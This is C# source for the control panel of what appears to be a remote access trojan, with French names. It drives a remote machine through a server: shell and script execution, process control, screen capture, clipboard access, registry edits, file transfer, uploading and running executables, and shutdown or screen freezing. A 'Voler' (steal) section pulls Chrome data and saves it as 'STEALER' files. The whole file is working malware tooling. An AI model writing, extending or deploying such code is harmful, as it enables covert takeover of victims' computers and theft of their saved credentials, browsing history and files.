using Serveur_Client_PCC.Configuration;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace Serveur_Client_PCC
{
    public partial class PanelControl : Form
    {
        System.Windows.Forms.Timer timer_receveur = new System.Windows.Forms.Timer();
        private static HttpRequester hr = new HttpRequester();
        public static JavaScriptSerializer serializer = new JavaScriptSerializer();
        private Dispatcher dispatcher;
        public string PC_ID;
        public string PC_NAME;

        public PanelControl(string pc_id, string pc_name)
        {
            InitializeComponent();
            this.dispatcher = new Dispatcher(this);
            this.PC_ID = pc_id;
            this.PC_NAME = pc_name;
            this.Name = pc_id;

            this.Text = "PC: " + pc_name;

            splitContainer1.FixedPanel = FixedPanel.Panel2;
            splitContainer2.FixedPanel = FixedPanel.Panel1;
        }

        private void PanelControl_Load(object sender, EventArgs e)
        {
            dispatcher.Request("InfosPc", null, "");
            timer_receveur.Tick += timer_receveur_Tick;
            timer_receveur.Interval = Parametre.refresh_ms;
            timer_receveur.Enabled = true;
            timer_receveur.Start();
        }
        private void PanelControl_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.timer_receveur.Stop();
            this.timer_receveur.Enabled = false;
            this.timer_receveur.Dispose();
        }

        private void timer_receveur_Tick(object sender, EventArgs e)
        {
            timer_receveur.Stop();
            var parent = Task.Factory.StartNew(() =>
            {
                var child = Task.Factory.StartNew(() =>
                {
                    string reponse = hr.get(Router.url("get_result") + PC_ID);
                    dispatcher.decode(reponse);
                });
            },
               TaskCreationOptions.DenyChildAttach
            );
            timer_receveur.Start();
        }

        #region Programmes
        private void actualiserProgramme_Click(object sender, EventArgs e)
        {
            dispatcher.Request("programmes", null);
        }
        private void desinstallerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in list_programmes.SelectedItems)
            {
                dispatcher.Request("programmes", "Desinstaller", item.SubItems[3].Text.Replace("\"", ""));
            }
        }
        private void sauvegarderToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (list_programmes.Items.Count > 0)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
                string dir = Environment.CurrentDirectory + "\\Downloads\\" + PC_NAME;
                dir = (Directory.Exists(dir)) ? dir : Environment.CurrentDirectory;
                sfd.InitialDirectory = dir;
                sfd.FileName = "PROGRAMMES_" + DateTime.Now.ToString("HH-mm_d-M-yyyy") + "_" + PC_NAME + ".txt";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    saveListView(list_programmes, sfd.FileName);
                }
            }
        } 
        #endregion

        #region Processus
        private void actualiserProcessus_Click(object sender, EventArgs e)
        {
            dispatcher.Request("processus", null);
        }
        private void tuerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (list_processus.SelectedItems.Count > 0)
            {
                dispatcher.Request("processus", "Tuer", list_processus.SelectedItems[0].Text);
            }
        }

        private void demarerUnProcessusToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string promptValue = Prompt.ShowDialog("Veuillez entrez le nom du processus:", "Lancer un Processus");
            if (promptValue != string.Empty)
            {
                dispatcher.Request("processus", "Demmarer", promptValue);
            }
        }
        #endregion

        #region Capture Ecran
        private void actualiserCaptureEcran_Click(object sender, EventArgs e)
        {
            dispatcher.Request("ecran");
        }
        private void enrgistrerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Images|*.png;*.bmp;*.jpg";
            string dir = Environment.CurrentDirectory + "\\Downloads\\" + PC_NAME;
            dir = (Directory.Exists(dir)) ? dir : Environment.CurrentDirectory;
            sfd.InitialDirectory = dir;
            sfd.FileName = "SCREEN_" + DateTime.Now.ToString("HH-mm_d-M-yyyy") + "_" + PC_NAME + ".png";
            ImageFormat format = ImageFormat.Png;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                string ext = System.IO.Path.GetExtension(sfd.FileName);
                switch (ext)
                {
                    case ".jpg":
                        format = ImageFormat.Jpeg;
                        break;
                    case ".bmp":
                        format = ImageFormat.Bmp;
                        break;
                }
                pictureBox1.Image.Save(sfd.FileName, format);
            }
        } 
        #endregion

        #region Clipboard
        private void btn_avoir_clipboard_Click(object sender, EventArgs e)
        {
            dispatcher.Request("clipboard", null, "avoir", null);
        }

        private void btn_mettre_clipboard_Click(object sender, EventArgs e)
        {
            dispatcher.Request("clipboard", null, "mettre", txt_sortie_clipboard.Text);
        }
        #endregion

        #region InfosPC / Cmd / Script
        private void actualiserInfosPc_Click(object sender, EventArgs e)
        {
            dispatcher.Request("InfosPc", null);
        }

        private void btn_OkScript_Click(object sender, EventArgs e)
        {
            if (txt_ScriptExtension.Text != string.Empty && txt_script.Text != string.Empty)
            {
                dispatcher.Request("script", null, txt_ScriptExtension.Text, txt_script.Text);
            }
            else
            {
                MessageBox.Show("Veuiller remplir tout les champ !");
            }
        }

        private void txt_cmdShell_KeyPress(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                e.Handled = true;
                if (txt_cmdShell.Text != string.Empty)
                {
                    btn_okShell.PerformClick();
                }
            }
        }
        private void btn_okShell_Click(object sender, EventArgs e)
        {
            if (txt_cmdShell.Text != string.Empty)
            {
                btn_okShell.Enabled = false;
                dispatcher.Request("cmd", null, "execute", txt_cmdShell.Text);
                txt_outputShell.Text += "\r\n Vous: " + txt_cmdShell.Text;
                txt_cmdShell.Text = string.Empty;
                btn_okShell.Enabled = true;
            }
            else
            {
                MessageBox.Show("Veuiller entrer une commande");
            }
        } 
        #endregion

        #region Historique
        private void actualiserToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            dispatcher.Request("historiques", null);
        }
        private void sauvegarderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (list_hist_chrome.Items.Count > 0)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
                string dir = Environment.CurrentDirectory + "\\Downloads\\" + PC_NAME;
                dir = (Directory.Exists(dir)) ? dir : Environment.CurrentDirectory;
                sfd.InitialDirectory = dir;
                sfd.FileName = "HISTORIQUES_" + DateTime.Now.ToString("HH-mm_d-M-yyyy") + "_" + PC_NAME + ".txt";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    saveListView(list_hist_chrome, sfd.FileName);
                }
            }
        }

        #endregion

        #region Registres
        private void treeView_registres_DoubleClick(object sender, EventArgs e)
        {
            dispatcher.Request("registres", null, treeView_Registres.SelectedNode.FullPath + @"\\");
        }

        private void treeView_registres_AfterSelect(object sender, TreeViewEventArgs e)
        {
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            dispatcher.Request("registres", null, treeView_Registres.SelectedNode.FullPath + @"\\");
        }

        private void ajouterUneCléToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string name = Prompt.ShowDialog("Veuillez entrez le nom de clé:", "Ajouter une clé");
            if (name != string.Empty)
            {
                string value = Prompt.ShowDialog("Veuillez entrez la valeur de la clé " + name + " :", "Ajouter une clé");
                dispatcher.Request("registres", "AddKey", treeView_Registres.SelectedNode.FullPath + @"\\", serializer.Serialize(new { name = name, value = value }));
            }
        }

        private void editerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (list_registres.SelectedItems.Count > 0)
            {
                string name = Prompt.ShowDialog("Veuillez entrez le nom de clé:", "Editer une clé: " + list_registres.SelectedItems[0].Text, list_registres.SelectedItems[0].Text);
                if (name != string.Empty)
                {
                    string value = Prompt.ShowDialog("Veuillez entrez la valeur de la clé " + name + " :", "Editer une clé: " + list_registres.SelectedItems[0].Text, list_registres.SelectedItems[0].SubItems[0].Text);
                    dispatcher.Request("registres", "AddKey", treeView_Registres.SelectedNode.FullPath + @"\\", serializer.Serialize(new { name = name, value = value }));
                }
            }
        }

        private void supprimerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in list_registres.SelectedItems)
            {
                dispatcher.Request("registres", "DeleteKey", treeView_Registres.SelectedNode.FullPath + @"\\", serializer.Serialize(new { name = item.Text }));
            }
        }
        #endregion

        #region Telechargement
        private void meunuTelechargement_Click(object sender, EventArgs e)
        {
            this.UseWaitCursor = true;
            var parent = Task.Factory.StartNew(() =>
            {
                var child = Task.Factory.StartNew(() =>
                {
                    string reponse = hr.get(Router.url("pc_file_liste") + PC_ID);
                    dynamic data = serializer.DeserializeObject(reponse);
                    string json = Encryption.Decrypt(Parametre.encryptionKey, data["d"]);
                    data = serializer.DeserializeObject(json);

                    if (!data["success"] == false)
                        MessageBox.Show(Convert.ToString(data["message"]), "error Chargement des Fichiers", MessageBoxButtons.OK, MessageBoxIcon.Error);

                    try
                    {
                        Action DoCrossThreadUIWork = () =>
                        {
                            list_telecharger.Items.Clear();
                        };
                        this.BeginInvoke(DoCrossThreadUIWork);

                        foreach (dynamic item in data["medias"])
                        {
                            ListViewItem lvi = new ListViewItem(item["id"]);
                            lvi.ImageIndex = 0;
                            lvi.SubItems.Add(item["name"]);
                            lvi.SubItems.Add(item["context"]);
                            lvi.SubItems.Add(item["date_created"]);

                            DoCrossThreadUIWork = () =>
                            {
                                list_telecharger.Items.Add(lvi);
                            };
                            this.BeginInvoke(DoCrossThreadUIWork);
                        }

                        DoCrossThreadUIWork = () =>
                        {
                            txt_download_count.Text = list_telecharger.Items.Count.ToString();
                        };
                        this.BeginInvoke(DoCrossThreadUIWork);
                    }
                    catch (Exception)
                    {
                        try
                        {
                            Action DoCrossThreadUIWork = () =>
                            {
                                txt_action_status.Text = "[+] " + data["message"];
                            };
                            this.BeginInvoke(DoCrossThreadUIWork);
                        }
                        catch { }
                    }
                });
            },
               TaskCreationOptions.AttachedToParent
            );
            this.UseWaitCursor = false;
        }
        private void telechargerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in list_telecharger.SelectedItems)
            {
                Thread th = new Thread(() =>
                {
                    if (!Directory.Exists("Downloads/"))
                    {
                        Directory.CreateDirectory("Downloads/");
                    }
                    string file_name = item.SubItems[1].Text;
                    string dir = "Downloads/" + PC_NAME + "/";
                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }
                    try
                    {
                        bool ok = false;
                        int i = 1;
                        while (!ok)
                        {
                            if (File.Exists(dir + file_name))
                            {
                                file_name = Path.GetFileNameWithoutExtension(file_name) + "_" + i + Path.GetExtension(file_name);
                            }
                            else
                            {
                                break;
                            }
                            i++;
                        }

                        string url = Router.url("get_file") + item.Text + "?token=" + Parametre.API_KEY;
                        using (var cl = new WebClient())
                        {
                            byte[] dataFile = cl.DownloadData(url);
                            File.WriteAllBytes(dir + file_name, dataFile);
                        }

                        setStatus("Fichier télécharger: " + file_name);
                    }
                    catch (Exception)
                    {
                        setStatus("Erreur: téléchargement du fichier: " + file_name);
                    }
                });
                th.Start();
            }
        } 
        #endregion
        
        #region Voler
        private void actualiserColerStripMenu_Click(object sender, EventArgs e)
        {
            dispatcher.Request("voleurs", null, "avoirChrome");
        }
        private void sauvegardeVOlerMenuItem_Click(object sender, EventArgs e)
        {
            if (list_voler.Items.Count > 0)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
                string dir = Environment.CurrentDirectory + "\\Downloads\\" + PC_NAME;
                dir = (Directory.Exists(dir)) ? dir : Environment.CurrentDirectory;
                sfd.InitialDirectory = dir;
                sfd.FileName = "STEALER_" + DateTime.Now.ToString("HH-mm_d-M-yyyy") + "_" + PC_NAME + ".txt";
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    saveListView(list_voler, sfd.FileName);
                }
            }
        }
        private void ouvrirToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in list_voler.SelectedItems)
            {
                Process.Start(item.SubItems[1].Text);
            }
        }
        private void copierToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string content = string.Empty;
            foreach (ListViewItem item in list_voler.SelectedItems)
            {
                content += item.Text + " | " + item.SubItems[1].Text + " | " + item.SubItems[2].Text + " | " + item.SubItems[3].Text + Environment.NewLine;
            }
            if (!string.IsNullOrEmpty(content))
            {
                Clipboard.SetText(content);
            }
        }
        #endregion

        #region MeunuStrip Gestion Fichier
        private void treeView_fichiers_DoubleClick(object sender, EventArgs e)
        {
            if (treeView_fichiers.SelectedNode != null)
            dispatcher.Request("fichiers", null, treeView_fichiers.SelectedNode.FullPath + @"\");
        }

        private void treeView_fichiers_AfterSelect(object sender, TreeViewEventArgs e)
        {
        }

        private void actualiserMenuItem6_Click(object sender, EventArgs e)
        {
            dispatcher.Request("fichiers", null, treeView_fichiers.SelectedNode.FullPath + @"\");
        }
        private void transfererUnFichierToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (treeView_fichiers.SelectedNode != null)
            {
                OpenFileDialog opd = new OpenFileDialog();
                DialogResult result = opd.ShowDialog();
                if (result == DialogResult.OK) // Test result.
                {
                    dispatcher.Request("fichiers", "GetFichier", opd.FileName, opd.SafeFileName, PC_ID, treeView_fichiers.SelectedNode.FullPath + @"\");
                }
            }
        }
        private void téléchargeeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (list_fichiers.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in list_fichiers.SelectedItems)
                {
                    dispatcher.Request("fichiers", "TelechargerFichier", treeView_fichiers.SelectedNode.FullPath + @"\" + item.Text);
                }
            }
        }
        private void supprimerFichierToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (list_fichiers.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in list_fichiers.SelectedItems)
                {
                    dispatcher.Request("fichiers", "Action", "supprimer-fichier", serializer.Serialize(new { path = treeView_fichiers.SelectedNode.FullPath + @"\" + item.Text }));
                }
            }
        }
        private List<string> Liste_chemin_Copier = new List<string> { };
        private List<string> Liste_chemin_Couper = new List<string> { };
        private void copierFichierToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (list_fichiers.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in list_fichiers.SelectedItems)
                {
                    Liste_chemin_Copier.Add(treeView_fichiers.SelectedNode.FullPath + @"\" + item.Text);
                }
            }
        }
        private void couperToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (list_fichiers.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in list_fichiers.SelectedItems)
                {
                    Liste_chemin_Couper.Add(treeView_fichiers.SelectedNode.FullPath + @"\" + item.Text);
                }
            }
        }
        private void collerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (list_fichiers.SelectedItems.Count > 0)
            {
                string bloc_obj = string.Empty;
                foreach (string fichier_chemin in Liste_chemin_Copier)
                {
                    dispatcher.Request("fichiers", "Action", "coller", serializer.Serialize(new { path = fichier_chemin, new_path = treeView_fichiers.SelectedNode.FullPath }));
                }
                foreach (string fichier_chemin in Liste_chemin_Couper)
                {
                    dispatcher.Request("fichiers", "Action", "deplacer", serializer.Serialize(new { path = fichier_chemin, new_path = treeView_fichiers.SelectedNode.FullPath }));
                }
            }
        }

        private void creeDossierToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string promptValue = Prompt.ShowDialog("Veuillez entrez le nom du dossier:", "Nouveau Dossier");
            if (promptValue != string.Empty)
            {
                dispatcher.Request("fichiers", null, "Action", serializer.Serialize(new { path = treeView_fichiers.SelectedNode.FullPath + @"\" + promptValue }));
            }
        }
        private void creeFichierToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string promptValue = Prompt.ShowDialog("Veuillez entrez le nom du fichier:", "Nouveau Fichier");
            if (promptValue != string.Empty)
            {
                string ext = Path.GetExtension(promptValue);
                if (ext == string.Empty)
                {
                    promptValue += ".txt";
                }
                dispatcher.Request("fichiers", "Action", "cree-fichier", serializer.Serialize(new { path = treeView_fichiers.SelectedNode.FullPath + @"\" + promptValue }));
            }
        }

        private void editerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (list_fichiers.SelectedItems.Count > 0)
            {
                dispatcher.Request("fichiers", "Editer", treeView_fichiers.SelectedNode.FullPath + @"\" + list_fichiers.SelectedItems[list_fichiers.SelectedItems.Count].Text, "0", "" );
            }
        }
        private void FichierMeunu_Opening(object sender, CancelEventArgs e)
        {
            if (list_fichiers.SelectedItems.Count > 0)
            {
                editerToolStripMenuItem.Enabled = false;

                string taille = list_fichiers.SelectedItems[0].SubItems[1].Text;
                try
                {
                    taille = taille.Replace("  MB", "");
                    int tailleInt = Convert.ToInt32(taille);
                    editerToolStripMenuItem.Enabled = (tailleInt < 50000) ? true : false;
                }
                catch (Exception)
                { }
            }
        }
        #endregion

        #region Fonction Fun
        private void btn_Ok_MsgBox_Click(object sender, EventArgs e)
        {
            if (txt_titre.Text != string.Empty && txt_message.Text != string.Empty)
            {
                string type = string.Empty;
                if (radioButton2.Checked)
                    type = "erreur";
                else if (radioButton3.Checked)
                    type = "attention";
                else
                    type = "default";

                dispatcher.Request("msgbox", null, type, txt_message.Text, txt_titre.Text);
            }
            else
            {
                MessageBox.Show("Veuiller remplir tout les champ !");
            }
        }
        private void ExecuterFichier_Click(object sender, EventArgs e)
        {
            //1- Upload sur le serveur
            //2- Envoye l'url du fichier avec commande exe
            OpenFileDialog opd = new OpenFileDialog();
            DialogResult result = opd.ShowDialog();
            if (result == DialogResult.OK) // Test result.
            {
                dispatcher.Request("fun", "TeleExe", opd.FileName, opd.SafeFileName, PC_ID);
            }
        }

        private void btn_eteindre_Click(object sender, EventArgs e)
        {
            dispatcher.Request("fun", null, "eteindre", serializer.Serialize(new { }));
        }

        private void btn_redemarer_Click(object sender, EventArgs e)
        {
            dispatcher.Request("fun", null, "redemarer", serializer.Serialize(new { }));
        }

        private void btn_fermerSes_Click(object sender, EventArgs e)
        {
            dispatcher.Request("fun", null, "session", serializer.Serialize(new { }));
        }

        private void btn_mettreEnVeille_Click(object sender, EventArgs e)
        {
            dispatcher.Request("fun", null, "veille", serializer.Serialize(new { }));
        }

        private void btn_hiberner_Click(object sender, EventArgs e)
        {
            dispatcher.Request("fun", null, "hiberner", serializer.Serialize(new { }));

        }

        private void btn_FreezeScreen_Click(object sender, EventArgs e)
        {
            dispatcher.Request("fun", null, "freeze", serializer.Serialize(new { }));
        } 
        #endregion

        private void saveListView(ListView lv, string path)
        {
            string content = "";
            foreach (ListViewItem item in lv.Items)
            {
                content += item.Text;
                foreach (System.Windows.Forms.ListViewItem.ListViewSubItem subItem in item.SubItems)
                {
                    content += "    |   " + subItem.Text;
                }
                content += Environment.NewLine;
            }
            File.WriteAllText(path, content);
        }
        public void setStatus(string text, bool status = true)
        {
            txt_action_status.Invoke((MethodInvoker)(() =>
            {
                txt_action_status.Text = "[+] " + text;
                if (status)
                {
                    txt_action_status.ForeColor = System.Drawing.Color.Green;
                }
                else
                {
                    txt_action_status.ForeColor = System.Drawing.Color.Red;
                }
            }));
        }
        public void setEvent(string text)
        {
            list_event.Invoke((MethodInvoker)(() =>
            {
                list_event.Items.Add(text);
                list_event.SelectedIndex = list_event.Items.Count - 1;
            }));
        }
    }
}
